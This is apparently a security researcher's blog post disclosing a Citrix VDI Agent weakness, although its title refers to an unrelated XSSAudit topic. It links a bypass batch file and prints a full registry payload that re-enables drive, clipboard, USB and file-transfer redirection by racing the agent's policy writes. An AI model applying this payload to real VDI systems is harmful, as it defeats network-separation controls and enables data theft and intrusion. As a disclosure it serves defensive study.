
---
title: "About the XSSAudit"
date: 2019-08-08 04:00:00 +0900
categories: XSS XSSAudit javascript
---

## Description


DescriptionThe Citrix VDI Agent(PicaSvc2.exe) seems to have a structure in which it receives policies from the Citrix management server, records them in the registry(HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Citrix\1\User\), and reads the policies from the registry to reflect the policies to the user's VDI.  
  
An attacker can bypass the Drive, Network, Clipboard, etc. security policies issued by the Citrix Policy Server through registry manipulation.  
  
## POC  
1. The attacker logs into VDI and executes a Bat file ([https://windshock.github.io/bypass.zip](https://windshock.github.io/bypass.zip)) that continuously modifies the registry. Then, they close the VDI connection.  
  
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Citrix\1\User]

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Citrix\1\User\CdmPolicies]
"AutoConnectDrives"=dword:00000001
"AllowCdromDrives"=dword:00000001
"AllowFixedDrives"=dword:00000001
"AllowFloppyDrives"=dword:00000001
"AllowNetworkDrives"=dword:00000001
"AllowRemoveableDrives"=dword:00000001
"UseAsyncWrites"=dword:00000001
"ReadOnlyMappedDrive"=dword:00000000

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Citrix\1\User\IO]
"AutoConnectClientLptPorts"=dword:00000001
"TryMapToClientDriveLetter"=dword:00000001
"AllowFileTransfer"=dword:00000001
"AllowFileUpload"=dword:00000001
"AllowFileDownload"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Citrix\1\User\VCPolicies]
"AllowComPortRedirection"=dword:00000001
"AllowDriveRedir"=dword:00000001
"AllowLptPortRedirection"=dword:00000001
"AllowPrinterRedir"=dword:00000001
"AllowClipboardRedir"=dword:00000001
"ReadonlyClipboard"=dword:00000001
"AllowUSBRedir"=dword:00000001
"RestrictSessionClipboardWrite"=dword:00000000
"RestrictClientClipboardWrite"=dword:00000000


2. When the attacker logs back into VDI, PicaSvc2.exe communicates with the Citrix server to receive policies and records the corresponding policies in the registry.  
  
3. While PicaSvc2.exe records and reads the policies, the registry's policy values are tampered with by the Bat file previously executed by the attacker.  
  
4. PicaSv2.exe reads the policies recorded in the registry (which were manipulated by the attacker) and reflects the manipulated policies on Windows.

## Exploit
The attacker would have to be logged into the company's Citrix VDI(windows 10 os) after taking over the company's account.  
  
The VDI is in a state where network, printer, external hard write read, clipboard read and write, etc. are restricted.

## Impact
For companies that use VDI for logical network separation purposes, this vulnerability can lead to internal information leakage and intrusion of internal servers.

DiscoveryUse process  [monitor(https://learn.microsoft.com/en-us/sysinte…](http://monitor%28https//learn.microsoft.com/en-us/sysinternals/downloads/procmon))  to monitor the functionality of the citrix agent(PicaSvc2.exe).  
  
Check the registry that the citrix agent uses to store policy settings.  
  
View and manipulate the contents of that registry.

<!--stackedit_data:
eyJoaXN0b3J5IjpbMTg3ODEyNDM0OF19
-->